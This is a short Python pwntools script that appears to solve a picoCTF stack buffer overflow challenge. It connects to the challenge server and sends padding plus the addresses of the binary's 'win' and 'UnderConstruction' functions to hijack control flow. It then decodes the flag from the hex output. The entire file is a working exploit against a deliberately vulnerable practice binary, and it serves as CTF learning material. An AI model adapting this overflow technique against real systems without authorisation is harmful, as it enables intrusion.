#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_gcc")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 50329)

    return r

# input_offset is the space-delimited offset from which input is parsed (starts from 0)
def parse_input(input_bytes, input_offset): 
    print(input_bytes)
    input_seqs = input_bytes.split(b' ')[input_offset:]
    return b''.join([bytes.fromhex(seq[2:].decode().rjust(8,'0')) for seq in input_seqs])

def main():
    r = conn()

    r.sendlineafter(b'flag\n', 
        b'A'*14 + # Offset when compiled with gcc - 22
        p32(exe.symbols.win) + 
        p32(exe.symbols.UnderConstruction)
    )

    # Discard a line of input
    r.recvline()

    # Generate flag
    flag = b''
    flag += parse_input(r.recvline().strip(), 3)
    flag += parse_input(r.recvline().strip(), 3)
    flag += parse_input(r.recvline().strip(), 3)
    print(flag[::-1])


if __name__ == "__main__":
    main()
